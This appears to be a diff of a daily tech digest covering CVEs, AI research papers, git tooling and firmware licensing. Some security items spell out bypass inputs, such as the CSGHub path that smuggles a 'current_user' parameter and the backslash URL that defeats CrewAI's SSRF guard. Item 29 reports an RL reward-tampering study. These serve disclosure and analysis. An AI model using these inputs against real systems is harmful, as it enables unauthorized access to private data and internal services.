-"BlindToChange" (Phukan, Goyal, Pruthi) makes an argument about what agentic search benchmarks can and cannot see. BrowseComp and its relatives "explicitly state what needs to be found," so an agent that never questions its own assumptions scores well: "While agents can search and easily find recent changes, the correctness of their responses depends on whether they search and what they search for." Real requests state only the final need — an itinerary for a trip — leaving the agent to discover that a museum is temporarily closed.
+`patch-gg/pixelfx` is a gallery of **244 pixel-art effects and animations**, "every one a small piece of code" — fire, explosions, magic, weather, UI, pickups, critters — each playable live, recolourable, mirrorable, exportable as sprite sheets, and droppable into a browser game. Effects that involve a character are "acted out": wind-up, release, freeze on contact, recovery, with twelve whole moves chaining effects into attacks. It ships with a Claude Code skill that makes new ones in the same style, credited to Hugo Duprez's method from his post on making pixel-art effects with Claude.
 
-The benchmark is built from requests "where an obvious candidate is no longer applicable due to a recent real-world event," with events drawn automatically from **Wikidata** so it can be "periodically refreshed" rather than frozen. The measured effect is large: "a big gap -- as high as 27.5 points, even at high reasoning effort -- in systems' performance, when the recent event is not explicitly mentioned compared to when we ask about it directly." Trajectory analysis attributes "more than half of the failures" to the specific behaviour: agents "do not directly search to verify whether a relevant fact has [changed]."
+The detail worth stealing is structural: the count in the README is written as `<!-- count -->244<!-- /count -->` — an HTML comment wrapping the number, so a tool that reads the page can find the claim without a regular expression guessing at prose. It is the cheapest possible answer to the class of bug where the number in a README drifts from the number in the code, and it costs two comment markers.
 
-**Why it matters:** 27.5 points is not a knowledge gap — the agents can find the change once asked — it is a *triggering* gap, and it is invisible to every benchmark that hands over the question. The refreshable-from-Wikidata design is the part worth stealing: any eval whose items are hand-written decays, and this one can be re-drawn from a live feed.
+**Why it matters:** for a feed that spends its time checking counts against artifacts, a repo that *delimits* its own count is the friendliest thing on GitHub today. The content is also genuinely useful — 244 small, licensed, individually-inspectable effects are a better asset for a game jam than any generated sprite sheet, and the skill alongside them is the export format that keeps the count growing.
 
-[`🔗 arXiv 2610.41435`](https://arxiv.org/abs/2610.41435) · [`🔗 Full text (HTML)`](https://arxiv.org/html/2610.41435v1)
+[`🔗 patch-gg/pixelfx`](https://github.com/patch-gg/pixelfx) · [`🔗 Live gallery`](https://patch-gg.github.io/pixelfx/) · [`🔗 Catalog`](https://github.com/patch-gg/pixelfx/blob/main/docs/CATALOG.md)
 
 ---
 
-## 19. worktrunk makes git worktrees addressable by branch — the missing plumbing for running ten agents at once
+## 20. An RL agent given only a quantum task reconstructs Minkowski causal structure inside its own predictive model
 
 - **Velocity:** ▮ steady
-- **Source:** GitHub Trending · 136 stars today · MIT OR Apache-2.0
-- **Tags:** `git` `worktree` `agents` `cli` `rust`
+- **Source:** arXiv 2611.03596 · submitted 2026-11-02
+- **Tags:** `research` `rl` `quantum` `world-models` `emergence`
 
-Worktrunk is a CLI for git worktree management built for one workflow: "AI agents like Claude Code and Codex can handle longer tasks without supervision, such that it's possible to manage 5-10+ in parallel. Git's native worktree feature gives each agent its own working directory, so they don't step on each other's changes." The gap it fills is ergonomic and real — "Even a task as small as starting a new worktree requires typing the branch name three times."
+The setup is deliberately stripped: a model-based reinforcement-learning agent maximising quantum mutual information between localised probes interacting with a quantum field in Minkowski spacetime, and it is never given the metric, the causal structure, or any information about either. What the agent builds to do the task is an internal predictive model whose planner "develops the characteristic null structure of spacetime" — from which the authors reconstruct the Minkowski metric's causal structure with high accuracy.
 
-The design decision is that **worktrees are addressed by branch name**, with paths computed from a configurable template, and commands that take a branch also accept the path of the worktree checked out there. Around those three core commands it adds hooks for local workflows and copy-on-write build caches, which is the part that makes parallel agents practical: ten worktrees without a shared build cache means ten cold builds.
+**Why it matters:** the claim is not that the agent discovered relativity, it is that causal structure was recoverable from operational experience alone — which is the strongest form of the argument that world models learn structure rather than correlations this feed has seen, and it comes with a task narrow enough to check. The obvious limit is that the field and the probes are chosen by the experimenter; the interesting residue is that *null* structure, the part that fixes which events can influence which, fell out of a prediction objective.
 
-**Why it matters:** running agents in parallel is now the default advice and the version-control story underneath it is usually skipped. A worktree-per-agent model is the correct isolation — separate index, separate HEAD, shared object store — and the tooling gap was never git's capability but its interface. At **9,958 stars** and 136 today, this is trending as infrastructure rather than as a demo.
-
-[`🔗 worktrunk repo`](https://github.com/max-sixty/worktrunk) · [`🔗 worktrunk.dev`](https://worktrunk.dev)
-
----
-
-## 20. Since we covered CVE-2026-98432 on 2026-11-02: Ubuntu still ships no kernel that closes it, three weeks after publication
-
-- **Velocity:** ▮ steady
-- **Source:** Ubuntu CVE tracker · publication 2026-10-15, last updated 2026-10-30
-- **Tags:** `cve` `linux-kernel` `ubuntu` `patching` `distributions`
-
-**Update to our 2026-11-02 item.** When we covered CVE-2026-98432 — the IPv4 TCP use-after-free that Go's MPTCP default put in front of every Go service on Linux — the story was the runtime default. The downstream half has since become the actionable one: Ubuntu's own CVE tracker lists the record as published **2026-10-15**, last updated **2026-10-30**, with Ubuntu priority **High** and a CVSS 3 severity score of **9.8 · Critical**, and as of 2026-10-31 reporting, "No patched kernels are available yet for 22.04, 24.04, or 26.04 despite a CVSS 9.8 rating." The tracker carries no ETA.
-
-The gap is between the mainline fix and the LTS kernels. The vulnerability is a request-socket ownership bug — `tcp_v4_syn_recv_sock()` "transfers ownership of ireq->ireq_opt to the child socket (newinet->inet_opt) without copying it," while a retransmitted SYN on another CPU can still read it under `rcu_read_lock()` only — and it is fixed by freeing those options after an RCU grace period. Upstream releases carrying the patch shipped before the Ubuntu advisory went stale; the LTS kernels did not follow in the same window.
-
-**Why it matters:** the mitigation we described on 11-02 — set `multipathtcp=0`, which a module declaring `go 1.23` gets by default — is now the *only* remedy available to an Ubuntu LTS host that cannot change its kernel. That is a materially different recommendation from "patch the kernel," and it is the difference between a distro that has the fix and one that does not. Check the tracker again before quoting any of this; a kernel update is exactly the kind of event that inverts the claim.
-
-[`🔗 Ubuntu CVE-2026-98432 tracker`](https://ubuntu.com/security/CVE-2026-98432) · [`🔗 Report: no patched LTS kernels (2026-10-31)`](https://freenode.net/article/ubuntu-lts-kernels-still-unfixed-for-critical-cve-2026-98432) · [`🔗 CVE record`](https://cveawg.mitre.org/api/cve/CVE-2026-98432)
-
----
-
-## 21. WorkOS says an "AI-assisted offensive security framework" reached its sales tool — the framework's name is in the CEO's Hacker News comment, not the bulletin
-
-- **Velocity:** ▮▮▮ trending
-- **Source:** Hacker News (self) · 60 pts · ~5h ago (~07:31 UTC+8)
-- **Tags:** `security` `incident` `identity` `ai-agents` `disclosure`
-
-WorkOS published a bulletin on 2026-11-02 for unauthorized access to an internal application used by its sales team, identified on **2026-10-30**. The bulletin scopes the incident to CRM and customer-support data: business contact details, account histories, and "summaries and excerpts from sales calls, support discussions, and customer Slack conversations", plus product-usage and directory-health metadata. It also states: **"There is no evidence that WorkOS application data was accessed, nor is there evidence that production WorkOS services were accessed or impacted."** The technique appears exactly once, as "an AI-assisted offensive security framework to automate reconnaissance and exploitation attempts," with Wiz, Google and CrowdStrike reporting on agentic intrusions linked as context.
-
-The name is not in the bulletin. In the Hacker News thread, CEO Michael Grinich writes: **"The attack involved ARTEX, an autonomous AI agent framework used to carry out offensive security operations."** That is a stronger attribution than the document carries — an actor and a tool rather than a technique — and it is the sentence every downstream story quotes. Both can be true; they are not the same claim, and only one of them is the vendor's formal notice.
-
-**Why it matters:** for an identity and SSO vendor the damaging material is not the contact list but the conversation excerpts, because a request to reissue a SAML certificate or reconnect a directory is exactly the kind of thing that sounds routine when it cites a real support thread and a real colleague. Two readings to keep separate: "no evidence" on day four is a statement about an investigation in progress, and the ARTEX attribution is the CEO's, not the bulletin's.
-
-[`🔗 WorkOS security bulletin`](https://workos.com/security/bulletins/october-30th-2026-data-security-incident) · [`🔗 HN thread + CEO comment`](https://news.ycombinator.com/item?id=50345712) · [`🔗 WorkOS security page`](https://workos.com/security)
-
----
-
-## 22. OpenAI's Pando cut median push latency by nearly 80% — on a monorepo whose reliability had fallen below 90%
-
-- **Velocity:** ▮▮▮ trending
-- **Source:** OpenAI Engineering · published 2026-11-02 · Aaron Friel, Taylor Blau, Ted Nyman
-- **Tags:** `git` `infrastructure` `monorepo` `agents` `source-control`
-
-OpenAI built a new Git backend, **Pando**, and now serves its entire monorepo from it without changing the client or the protocol. The framing is explicitly agent-driven: Codex raised the number of branches, pushes, merges and fetches per engineer, "with reliability at times falling below 90%" before the rebuild. The production numbers are stated plainly: median push latency down **nearly 80%** (also written as "nearly 5x"), **nearly a petabyte of Git data per day**, more than **57 TB of Git packs in a single hour** with over 99% of those bytes from local disk cache, a median packfile under **20 KiB** and a 99th percentile under **3 MiB**, and a petabyte/day served "with just a handful of CPU cores".
-
-The design has two moving parts. Pando coordinates updates to each branch independently, so unrelated branch pushes proceed in parallel; and it reuses packfiles across fetches instead of generating one per client, so many readers get the same bytes. The cost is stated in the post rather than discovered by a reader: "a reader looking at several branches can see them at different points of time." Upstream contributions came out of the work — `packfile-uri` tracing and byte counts, validation when accepting an existing pack, and fixes around concurrent downloads and interrupted transfers.
-
-**Why it matters:** agent concurrency turned source control into a throughput problem, and the answer here is per-branch causal consistency rather than a global lock — a trade you should name before adopting it, because cross-branch atomic reads are the thing you give up. The performance claims are production self-reports with no stated baseline beyond "the previous backend", and "nearly 5x" and "nearly 80%" are the same measurement in two units, not two results.
-
-[`🔗 Scaling Git at OpenAI`](https://openai.com/index/scaling-git-at-openai/) · [`🔗 OpenAI news index`](https://openai.com/news/)
-
----
-
-## 23. OpenAI's LifeVal shows five everyday tasks at 90.4%–100% — and no average, no model name, and no task count
-
-- **Velocity:** ▮▮ rising
-- **Source:** OpenAI Research · published 2026-11-02
-- **Tags:** `eval` `agents` `benchmark` `openai` `transparency`
-
-LifeVal is a new OpenAI evaluation of "tasks that matter in everyday life", built from the American Time Use Survey and the Multinational Time Use Study plus a new demographically representative survey of **3,995** respondents, covering caregiving, health, education, household administration, personal finance, shopping and government services. The published page is a set of worked examples, each with a score: **93.1%** for comparing kindergartens and shortlisting enrolment, **98.0%** for organising flood-prep volunteers, **100%** for finding a home in Luzerne County and adding the deed to a cart, **96.3%** for setting up a shared game stream with a grandparent, and **90.4%** for a meal plan after a diabetes diagnosis. Then one summary sentence: **"Our latest models score very highly on many LifeVal tasks."**
-
-What the page's text does not carry: which model or version, how many tasks the evaluation contains, an aggregate score, a failure example, or a methodology and limitations section. A "See more" control sits under the examples, so more rows plausibly exist behind it — but the five numbers above are the ones in the server-rendered page, and the only quantitative claim about the benchmark as a whole is the sentence above.
-
-**Why it matters:** an eval published as five passing examples is a capability claim, not a measurement anyone else can compare against — there is no denominator, no model version to pin, and no stated task distribution. Quote the examples as examples. The survey work underneath is the more reusable artifact: 3,995 respondents is a defensible way to choose what to measure, and the omission is what happens after that choice.
-
-[`🔗 LifeVal`](https://openai.com/index/lifeval/) · [`🔗 OpenAI Research index`](https://openai.com/research/)
-
----
-
-## 24. Netpbm's September release fixed buffer overruns written in 1988 — the seven CVEs for them arrived five weeks later
-
-- **Velocity:** ▮▮ rising
-- **Source:** NVD (VulnCheck CNA) · records published 2026-11-02 · release 10.86.51 dated 2026-09-28
-- **Tags:** `cve` `netpbm` `memory-safety` `image-parsing` `disclosure`
-
-Seven VulnCheck records published 2026-11-02 describe memory-safety bugs in Netpbm's format converters: a heap overflow in **sgitopnm** (`readChannels()`, RLE-compressed SGI), an integer overflow in **winicontopam** on oversized ICO/CUR dimensions, stack overflows in **picttoppm**'s `paintPoly()` and `scanPoly()`, a heap overflow in **xpmtoppm** from an unvalidated characters-per-pixel value, an integer overflow in **jbigtopnm**, and an out-of-bounds read in **tgatoppm**'s `get_pixel()`. The fixed versions are given per branch: before **10.86.51**, 11.x before **11.02.30**, and 11.03 before **11.15.08** (the first record says 11.02.29 / 11.15.07). All seven are **`Awaiting Analysis`** at NVD, so every score is the CNA's: **CVSS 3.1 7.8** with `AV:L/AC:L/PR:N/UI:R`, and **CVSS 4.0 8.5** with `AV:L/UI:P` — the same bug in two frameworks with different interaction assumptions.
-
-The changelog is larger and older than the batch. Release **10.86.51 (2026-09-28)** lists fixes in seventeen programs plus a build fix, most annotated "Always broken" with the introduction date: `picttoppm` since 1988, `tgatoppm` since 1989, `pjtoppm` and `imgtoppm` since 1991, `xpmtoppm` and `sgitopnm` since 1994, `jbigtopnm` since 9.2 (2000). Several entries credit "Discovered and diagnosed by Tristan Madani", and one is unusually candid about provenance: **"picttoppm: fix buffer overrun with very large polygons in input. Always broken -- in fact done intentionally for coding convenience (picttoppm was in primordial Netpbm in 1988)."**
-
-**Why it matters:** the batch covers six converters; the release note covers seventeen converters, five weeks earlier. If your exposure list is the CVE feed, it is a subset of the patch you already needed — and "always broken" means these are not regressions from a refactor but properties the code has had since the 1980s. Patch to the branch level named in the record, not to "latest".
-
-[`🔗 CVE-2026-120431 (NVD)`](https://nvd.nist.gov/vuln/detail/CVE-2026-120431) · [`🔗 Netpbm 10.86.51 changelog (SVN)`](https://svn.code.sf.net/p/netpbm/code/!svn/bc/5371/super_stable/doc/HISTORY) · [`🔗 VulnCheck advisory`](https://www.vulncheck.com/advisories/netpbm-before-10.86.51-11.02.29-and-11.15.07-sgitopnm-heap-buffer-overflow)
-
----
-
-## 25. CSGHub serves private model and code files to anonymous callers — the portal signs the request with its own admin key
-
-- **Velocity:** ▮▮ rising
-- **Source:** VulnCheck CVE-2026-120426 · published 2026-11-02 · issue #1586 opened 2026-10-31
-- **Tags:** `cve` `idor` `model-hub` `self-hosted` `unfixed`
-
-`CVE-2026-120426` describes an authorization bypass in **OpenCSG CSGHub** through `v2.6.0-ce`: an unauthenticated caller can read files in private model, code and space repositories by injecting a percent-encoded `current_user` parameter into the file path. The reporter's own write-up in issue #1586 traces it precisely. `GET /:repo_type/:namespace/:name/resolve/:branch/*path` is registered in a bare route group with no per-route guard, unlike the upload routes above it; with no `user_token` cookie the portal fetches through the backend using the **global server API key**; on that privileged call the acting identity is carried only as a `current_user` query parameter, and the attacker-controlled path is interpolated with `%s` ahead of `?current_user=%s` with no escaping. Because Gin decodes a percent-encoded query separator inside the catch-all segment, a path ending `README.md%3Fcurrent_user%3D<owner>%26` overrides the parameter. Datasets are unaffected — their routes use a login middleware the others lack.
-
-VulnCheck scored it **CVSS 4.0 8.7** (`PR:N/VC:H`) and **CVSS 3.1 7.5** — both from the same CNA, at different framework conventions — and NVD's status is **`Deferred`**. There is no fixed release to install: the issue was opened 2026-10-31 and is still open, the newest release is **v2.6.0-ce (2026-10-15)**, and `main`'s last commit is **2026-09-19**.
-
-**Why it matters:** a self-hosted model hub holds the weights, the dataset, and whatever tokens were committed beside them, so an unauthenticated GET is the whole exposure — no write and no RCE needed. The failure is architectural rather than a typo: a user-facing route falling back to the administrative service credential, with the user's identity then asserted by a query parameter. Until a release exists, the mitigation is at the proxy: deny anonymous access to `*/resolve/*` or require a session for private namespaces.
-
-[`🔗 CVE-2026-120426 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-120426) · [`🔗 Issue #1586 (full trace)`](https://github.com/OpenCSGs/csghub/issues/1586) · [`🔗 VulnCheck advisory`](https://www.vulncheck.com/advisories/opencsg-csghub-through-2.6.0-ce-unauthenticated-private-repository-file-read-via-resolve-route)
-
----
-
-## 26. WSO2's 9.4 says no privileges are required — its own description says the attacker needs a lower-privilege role
-
-- **Velocity:** ▮▮ rising
-- **Source:** CVE record (WSO2 CNA) · reserved 2025-10-20 · published 2026-11-02
-- **Tags:** `cve` `wso2` `access-control` `cvss` `api-gateway`
-
-`CVE-2025-11969` is a System REST API access-control failure in WSO2 API Manager. The record's description is about a logged-in user: **"The System REST APIs do not correctly enforce access control mechanisms, allowing users with lower privilege roles to execute administrative actions that should be restricted."** The metric attached to the same record is not: **CVSS 3.1 9.4** with `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`, where `privilegesRequired: NONE` describes an unauthenticated attacker. Recomputing that vector with `PR:L` — the value the prose implies — gives **8.3**. Both numbers are WSO2's; NVD's status is `Awaiting Analysis`, so there is no second opinion on the record.
-
-The scope is broad and build-pinned. Nine API Manager branch lines from **3.1.0** to **4.5.0** each carry a build-number ceiling (for example `4.5.0` before `4.5.0.32`), alongside WSO2 Identity Server as Key Manager 5.10.0, Open Banking AM and IAM 2.0.0, API Control Plane, Universal Gateway and Traffic Manager. Two Maven artifacts (`org.wso2.carbon.apimgt.rest.api.util` and `.common`) list per-version fix builds, and the record states that APIs exposed through the API Gateway are not affected. The ID was reserved on **2025-10-20** and published on **2026-11-02**, 378 days later.
-
-**Why it matters:** `PR:N` versus `PR:L` is the difference between patching on your normal schedule and treating the deployment as exposed now, and it moves the score by more than a point. The record does not resolve it, and the vendor advisory it links did not render for me, so the honest reading is the conservative one: assume a low-privileged account is enough until someone publishes a request that works without a session. Either way the fixed builds are named per branch — "upgrade API Manager" is not the instruction.
-
-[`🔗 CVE-2025-11969 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2025-11969) · [`🔗 NVD record`](https://nvd.nist.gov/vuln/detail/CVE-2025-11969)
-
----
-
-## 27. Auriga closes 68.3% of RoboDojo's planning–execution gap — and the number that makes the case is the 22.5% it starts from
-
-- **Velocity:** ▮▮ rising
-- **Source:** arXiv 2611.01112 · submitted 2026-10-31 · 21 authors
-- **Tags:** `robotics` `agents` `harness` `embodied` `benchmark`
-
-The Auriga technical report starts with a measurement that is not about its own system: on RoboDojo, a benchmark that separates high-level task decisions from physical execution, **removing arm execution raises GPT-6 Astra's success rate from 22.5% to 76.2%**. The gap is the interface, not the model. Auriga is a task-agnostic harness that tries to close it — the model decides over an explicit task belief and acts through tool calls or synthesised multi-step Python; the harness supplies calibrated 3D measurements, finger-referenced dual-arm control, a single admission gateway to the robot, a paused visual trajectory preview before motion, and stage-tolerance checks during execution that stop the robot and return the measured discrepancy for in-place recovery. The authors report it closes **68.3%** of that gap zero-shot, ranks first on RoboDojo with **57.7%** success (**64.0** score), "more than doubling the reference harness on the same model", and stays first under scene randomisation while learned policies drop by up to **33.9%**. On RoboCasa365 the same frozen harness reaches **73.2%**, up to 23.1% ahead of VLA-assisted agents on composite tasks.
-
-The caveats are structural. The harness was developed across **13 cross-task capability iterations** and then frozen for evaluation — an honest description of how much iteration sits behind a "zero-shot" number, but iteration nonetheless. The leaderboard is the authors' own submission on a benchmark whose reference control interface is what the 22.5% was measured against. And the 68.3% is a fraction of a gap defined by one model on one benchmark.
-
-**Why it matters:** the transferable result is the 22.5 → 76.2 swing, because it says most of the embodied-agent deficit on this benchmark lives in the control interface rather than in perception or planning. That is a claim about where to spend engineering, and it is also why a harness paper can beat a model paper on the same leaderboard without either being wrong.
-
-[`🔗 Auriga (arXiv)`](https://arxiv.org/abs/2611.01112) · [`🔗 Auriga project page`](https://auriga.stelledge.com/) · [`🔗 Code`](https://github.com/lose4578/Auriga)
-
----
-
-## 28. Four prompt optimizers, eight tasks, no significant gain on strong reasoners — and one arm collapsed to the judge floor in 3 of 5 runs
-
-- **Velocity:** ▮▮ rising
-- **Source:** arXiv 2611.01135 · submitted 2026-10-31 · Zhengshuai Yang, Changyun Li
-- **Tags:** `prompt-optimization` `evals` `reasoning` `negative-result` `research`
-
-"Compile as Hypothesis" tests the assumption underneath every prompt-optimisation tool: that searching over prompts reliably improves downstream accuracy. Across four optimizer families — genome search, profile-guided mutation, GEPA and ESPO — and eight tasks, measured in paired same-day runs, the authors find **"no statistically significant accuracy gains on strong reasoners."** One structural finding is not a null result: a discrete structural genome prevents a bimodal seed-collapse, where unconstrained search "collapses toward the judge floor in **3/5 runs**".
-
-The paper's useful contribution is a three-dimensional headroom typology over 190-problem knowledge-intensive evaluations: prompt optimisation cannot compensate for an intrinsic knowledge deficit or for physical token truncation, but it does resolve protocol and formatting errors. On `gpt-6`, free-text reflective search (GEPA) gains **+0.14** where structured search stays flat — and the ablation splits that gain into roughly **0.035 from judge-rubric reconstruction** and **0.105 from genuine instruction refinement**. The authors also report exposing "silent backend-mixing in commercial APIs during outage windows" and ship per-call audit verification for it.
-
-**Why it matters:** the split is the finding to carry. If a third of a measured prompt gain is the judge's rubric being reconstructed rather than the instruction being improved, then any optimisation loop scored by an LLM judge is measuring partly its own rubric — and the typology tells you which failures are addressable at all. If your task is knowledge-bound rather than format-bound, the honest expectation from this paper is zero.
-
-[`🔗 Compile as Hypothesis (arXiv)`](https://arxiv.org/abs/2611.01135) · [`🔗 cs.AI listing (2026-10-31)`](https://arxiv.org/list/cs.AI/2026-10-31)
-
----
-
-## 29. Give PPO a button that resets its needs and it solves 2 of 80 seeds instead of 71
-
-- **Velocity:** ▮ steady
-- **Source:** arXiv 2611.01183 · submitted 2026-10-31 · Chase J. Metoyer
-- **Tags:** `rl` `reward-hacking` `wireheading` `pre-registration` `research`
-
-Bounded intrinsic rewards are usually treated as safe from gaming on the argument that a capped signal cannot pay to exploit. This paper tests it directly. A homeostatic satiation reward gives an agent needs that build up and pay out when relieved; add one cheap action that resets the needs, and in **MiniGrid DoorKey-8x8** PPO agents solve **2 of 80 seeds**, against **71 of 80** on the same seeds without the action. In **KeyCorridorS3R1** it is **0 of 20** against **20 of 20**. The policies stay near-uniform, which is the interesting part: this is not a policy that learned a clever exploit, it is one that found a button and stopped.
-
-The paper does the theory too. A telescoping argument caps any policy's satiation return at the needs' starting drive, and a post-hoc computation shows that at every growth rate trained, a solving trajectory beats that cap on all sampled layouts — so the reward does not ask for the behaviour that appeared. Two controls land it: with advantage normalisation on, a satisfaction signal the agent could fill itself was worse than none (**11 of 20** solved with task reward alone versus **1 of 20** with the tamperable signal), and a per-press cost of **0.1** restored the task in every seed. All predictions were pre-registered and hash-locked from round 3, and **9 of 23 hypotheses were not supported** — each is reported.
-
-**Why it matters:** "bounded" is a property of the range, not of the incentive; the exploit here needs no reward hacking in the usual sense, only an action that satisfies the signal without doing the task. The per-press cost restoring every seed is the practical lever — price the reset — and the pre-registration with nine published failures is the reason to trust the other fourteen.
-
-[`🔗 Satisfied, Not Solving (arXiv)`](https://arxiv.org/abs/2611.01183) · [`🔗 cs.LG listing (2026-10-31)`](https://arxiv.org/list/cs.LG/2026-10-31)
-
----
-
-## 30. Polyend published the Tracker firmware source under PolyForm Noncommercial — the plugin SDK is MIT, the synth engine is still two `.a` files
-
-- **Velocity:** ▮▮ rising
-- **Source:** Polyend · announced 2026-11-02 · HN 100 pts
-- **Tags:** `open-source` `licensing` `embedded` `firmware` `hardware`
-
-Polyend published the firmware source for the original **Tracker**, **Tracker+** and **Tracker Mini** on 2026-11-02, alongside a **Tracker Community Edition 1.0** that installs on all three instruments. The announcement is explicit that you can "modify the firmware yourself and share your own version", and that a recovery path exists: "We've built in a recovery system to keep a faulty firmware build from bricking your Tracker." The repository (`polyend/tracker-ce`) documents the hardware split — an NXP Kinetis MK66FX1M0 Cortex-M4F at 180 MHz in the original, i.MX RT1051/RT1064 Cortex-M7 at 600 MHz in the Plus and Mini.
-
-The licence is the part worth reading. It is a three-part document: the firmware and most headers under **PolyForm Noncommercial 1.0.0**; the `.ptfx` Sample Editor plugin SDK (`editor-fx-sdk/`) under **MIT**, with the text saying developers are "expressly permitted to build, distribute, and sell" those plugins; and two precompiled static archives, `synth/lib/libPolySynth.a` and `synth/lib/libPolyDSP.a`, kept **proprietary**. Commercial music made with the firmware is explicitly permitted; selling the firmware or a derivative, or putting it in a commercial hardware product, is not. GitHub's licence detector reports the repository as **NOASSERTION**, which is what an unrecognised composite looks like.
-
-**Why it matters:** this is source-available with a deliberate commercial carve-out, not open source — the synthesis engine you would need to build a genuinely new instrument remains a binary. The split is also a template more hardware vendors will reach for: permissive where the community adds value (plugins), noncommercial where the product is, closed where the DSP is.
-
-[`🔗 Tracker firmware announcement`](https://polyend.com/whats-up/tracker-the-biggest-update-yet/) · [`🔗 polyend/tracker-ce`](https://github.com/polyend/tracker-ce) · [`🔗 LICENSE (PolyForm NC + MIT SDK)`](https://github.com/polyend/tracker-ce/blob/main/LICENSE)
-
----
-
-## 31. syscall.sh relaunched with 27 architecture tables and a JSON endpoint per architecture
-
-- **Velocity:** ▮ steady
-- **Source:** Show HN · 215 pts · ~19h ago (~17:29 UTC+8)
-- **Tags:** `linux` `syscalls` `reference` `json` `devtools`
-
-syscall.sh is a browsable index of Linux system-call tables, rebuilt and relaunched — the about page says it began in 2020, went on hiatus, and is "being maintained again" as of 2026. It now covers **27 architectures**, each with per-call numbers, arguments and register conventions: **369** syscalls on x86_64 since 3.3, **441** on i386, **326** on AArch64 since 3.7, **327** on RISC-V 64 since 4.15, **439** on the ia32 compat layer, and so on down to Hexagon, MicroBlaze and Xtensa. Tables run from Linux **3.3 to 7.3**, and every architecture also ships as a plain JSON file — `/<arch>/syscalls.json` — alongside an API.
-
-**Why it matters:** syscall numbers are not portable across architectures and not stable across kernel versions, which is precisely the detail that breaks emulators, sandbox seccomp profiles, tracing tools and hand-written assembly. Having the tables as JSON per arch turns a lookup problem into a build input — and the per-call history of when something appeared or was dropped is the part that a header file cannot tell you.
-
-[`🔗 syscall.sh`](https://syscall.sh/) · [`🔗 x86_64 table as JSON`](https://syscall.sh/x64/syscalls.json) · [`🔗 About`](https://syscall.sh/about)
-
----
-
-## 32. CrewAI's SSRF guard parsed the URL with `urlparse` and fetched it with `urllib3` — one backslash splits them, and the CVE shipped with no score from anyone
-
-- **Velocity:** ▮▮▮ trending
-- **Source:** CERT/CC CNA (cveawg) · published 2026-11-02 · NVD status `Deferred`
-- **Tags:** `cve` `crewai` `ssrf` `ai-agents` `parser-differential`
-
-`CVE-2026-120630` says CrewAI "contains an SSRF vulnerability caused by its SSRF guard and HTTP client, which both miss malicious content in URLs by checking opposite content passed to it, enabling any request that injects a malicious URL to perform SSRF, such as with the ScrapWebsiteTool." The record was published on 2026-11-02 and its `affected[]` entry is `{version: "0", lessThan: "1.15.17"}` with `versionType: "custom"` — product labelled **CrewAI**, though the package the fix landed in is `crewai-tools`. Its `problemTypes` names the class as free text — the description reads `CWE-918 Server-Side Request Forgery (SSRF)`, with **no `cweId` field populated** — and it carries **no `metrics` key at all**: NVD lists 0 metrics, the status is `Deferred`, and there is no third-party score either, so "CVSS" has no value to report here from any party.
-
-The mechanism is documented in the researcher's own write-up, dated 2026-09-05. Python's `urlparse` reads `http://127.0.0.1:8080\@1.1.1.1/` as a username of `127.0.0.1:8080\` and a host of **1.1.1.1**; `urllib3.util.parse_url` reads the same string as a host of **127.0.0.1**. The post states the pair of results directly and says of the guard: "The guard passed and the internal service responded." The same author found the identical pattern in IBM's Langflow, which became **`CVE-2026-19304`** — 7.7 from IBM's PSIRT, `vulnStatus: Analyzed` with the metric sourced to `psirt@us.ibm.com` and **0 NVD-scored metrics**, which makes the 7.7 an NVD-endorsed CNA number rather than an NVD one. The fix for CrewAI is **PR #6981**, "fix(tools): pin SSRF fetches to the validated peer IP", merged **2026-08-17** — 77 days before the CrewAI record — and its own body describes the gap in connect-time terms rather than parser terms: the fetch "did not connect to the IP that `validate_url` checked", because urllib3 re-resolves DNS when it opens the socket. The fix mounts an `SSRFProtectedAdapter` that checks the resolved peer IP at connection time, which closes the backslash case as a side effect rather than as its stated target.
-
-**Why it matters:** a denylist that runs on one parser and a socket that is opened by another is not a check, and no amount of testing `127.0.0.1` as a literal exercises it. Two things to take from the record: an `Analyzed` status with a `Secondary` metric and zero `nvd@nist.gov` rows means NVD *endorsed* IBM's 7.7, not that NVD computed it; and note that the write-up's remark that Langflow is in CISA's KEV catalog is true of the *product* — it has six KEV entries, from CVE-2025-3248 through CVE-2026-9198 — but **not** of `CVE-2026-19304`, which is in none of them.
-
-[`🔗 CVE-2026-120630 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-120630) · [`🔗 parser-differential write-up`](https://www.badcast.dev/blog/parser-differential-ssrf-ai-agents/) · [`🔗 crewAI PR #6981`](https://github.com/crewAIInc/crewAI/pull/6981) · [`🔗 CVE-2026-19304 (Langflow)`](https://cveawg.mitre.org/api/cve/CVE-2026-19304)
-
----
-
-## 33. Ten router records from one CNA in six hours, eight of them 10.0 — and the 4.0 score NVD serves for all ten is the base minus `E:P`
-
-- **Velocity:** ▮▮▮ trending
-- **Source:** NVD + cveawg · published 2026-11-02T00:18Z–06:17Z · all ten `Deferred`
-- **Tags:** `cve` `cvss` `iot` `router` `provenance`
-
-VulDB published ten firmware records for consumer routers between **2026-11-02T00:18Z and 06:17Z** — nine for WAVLINK (five on `WN536AX6-A V260507_2.0.0`, two on `WN536AX6-A V260507`, two on `WN551X3-A M51X3_V251020-WO-182e965`) and one for the **Linksys E8450 1.2.00.360516**. Eight of the ten carry **10.0** on CVSS 3.1 and 4.0 in the CNA container; the other two are 9.9/9.4 and 5.3/6.9. The WAVLINK ones are command injection and `strcpy` stack overflows reached through the web management interface, and their descriptions state "The exploit has been made available to the public and could be used for attacks." The Linksys one says the vendor "did not respond in any way". NVD's status for all ten is **`Deferred`** — nobody is going to analyze them.
-
-The numbers are the story. Every one of these vectors carries a Threat component, `E:P` (and, on 3.1/3.0, `RL:X/RC:R`). Recomputing the v4.0 strings with a v4.0 implementation gives the two stopping points directly: `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` scores **10.0** without `E`, and **9.3** with `E:P`. VulDB's container stores **10.0** in `baseScore` beside a vector that includes `E:P`; NVD stores **9.3** on the same vector. That holds **10 of 10**, not just the ten-pointers: −0.7 on the eight 10.0s, −0.8 on the 9.4, and −1.4 on the 6.9 (which NVD carries as 5.5). The v3.1 column shows no such gap — NVD keeps the base there, so both copies read 10.0.
-
